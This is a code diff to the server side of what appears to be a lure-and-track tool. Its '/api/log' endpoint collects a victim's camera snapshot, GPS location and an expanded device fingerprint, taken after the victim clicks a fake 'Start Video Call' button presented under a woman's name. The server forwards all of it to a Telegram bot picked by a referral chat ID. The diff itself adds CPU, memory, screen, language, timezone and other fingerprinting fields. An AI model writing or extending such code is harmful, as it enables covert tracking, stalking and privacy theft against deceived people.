@@ -23,11 +23,22 @@ function dataURItoBuffer(dataURI) {
 // Log endpoint: receives photo & location and sends to Telegram bot
 app.post('/api/log', async (req, res) => {
   try {
-    const { name, photo, lat, lon, acc, ref, status, isLocationUpdate, battery, network, device } = req.body;
+    const { 
+      name, photo, lat, lon, acc, ref, status, isLocationUpdate, 
+      battery, network, device, cpuCores, deviceMemory, 
+      screenResolution, colorDepth, language, platform, timezone, 
+      touchPoints, cookiesEnabled 
+    } = req.body;
     const targetChatId = ref || DEFAULT_CHAT_ID;
     const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
 
-    const deviceInfoText = `📱 **Device:** ${device || 'Unknown'}\n🔋 **Battery:** ${battery || 'Unknown'}\n📶 **Network:** ${network || 'Unknown'}`;
+    const deviceInfoText = `📱 *Device:* ${device || 'Unknown'} (${platform || 'Unknown'})\n` +
+      `🔋 *Battery:* ${battery || 'Unknown'}\n` +
+      `📶 *Network:* ${network || 'Unknown'}\n` +
+      `💻 *CPU Cores:* ${cpuCores || 'Unknown'} | *RAM:* ${deviceMemory || 'Unknown'}\n` +
+      `🖥️ *Screen:* ${screenResolution || 'Unknown'} (${colorDepth || 'Unknown'})\n` +
+      `🌍 *Language:* ${language || 'Unknown'} | *Timezone:* ${timezone || 'Unknown'}\n` +
+      `👆 *Touch Points:* ${touchPoints || 0} | *Cookies:* ${cookiesEnabled || 'Unknown'}`;
 
     if (status === 'clicked') {
       const clickMsg = `⚡ **Instant Alert!**\n👤 User clicked Start Video Call for: *${name || 'Haleema'}*\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}\n⏳ Capturing camera snapshot & GPS location...`;
